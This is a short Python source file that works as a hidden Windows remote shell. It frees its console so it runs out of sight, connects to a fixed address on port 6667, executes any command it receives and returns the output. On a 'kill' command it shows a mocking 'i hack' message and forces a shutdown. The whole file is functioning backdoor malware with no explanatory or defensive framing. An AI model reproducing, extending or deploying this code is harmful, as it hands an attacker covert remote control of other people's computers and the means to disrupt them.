import socket, os, subprocess, ctypes

ctypes.windll.kernel32.FreeConsole()

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect(("192.168.0.15",6667))
while True:
    cmd = conn.recv(1024).decode('utf-8')
    if cmd == "exit":
        break
    if cmd == "kill":
        os.system("msg %username% your system will be shutdown because i hack then :) lol")
        os.system("shutdown -s -t 3")
    os.system(cmd)
    output = subprocess.getoutput(cmd)
    conn.send(output.encode('utf-8'))
    os.system("cls")
conn.close()
exit()